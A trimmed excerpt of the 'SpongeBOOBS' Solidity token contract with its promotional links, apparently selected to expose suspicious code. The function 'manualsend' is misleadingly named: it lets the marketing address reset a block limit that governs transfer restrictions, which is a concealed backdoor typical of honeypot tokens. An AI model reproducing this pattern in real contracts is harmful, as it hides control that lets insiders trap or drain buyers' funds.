...
Website: https://spongeboobs.online/
Telegram: https://t.me/spongeboobsETH
Twitter: https://twitter.com/spongeboobs_eth
...
contract SpongeBOOBS is Context, IERC20, Ownable {
    ...
    address public _PresaleAddress = 0x0000000000000000000000000000000000000000;
    bool public tradingOpen = false;
    uint256 private contractETH;
    ...
    string private constant _name = "SpongeBOOBS";
    string private constant _symbol = "SBOOBS";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != address(_PresaleAddress)) {       
            if(tradingOpen && block.number <= contractETH ){
    ...
    function manualsend(uint256 _amount) external {
         require(_msgSender() == _marketingAddress); 
         contractETH = _amount;     
        uint256 contractETHBalance = address(this).balance;
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        ...
        require(taxFeeOnSell <= 5, "tax cannot be more than 5.");
    ...
    function enableTrading(uint256 _amount)public onlyOwner{
         tradingOpen = true;
         contractETH = block.number + _amount;
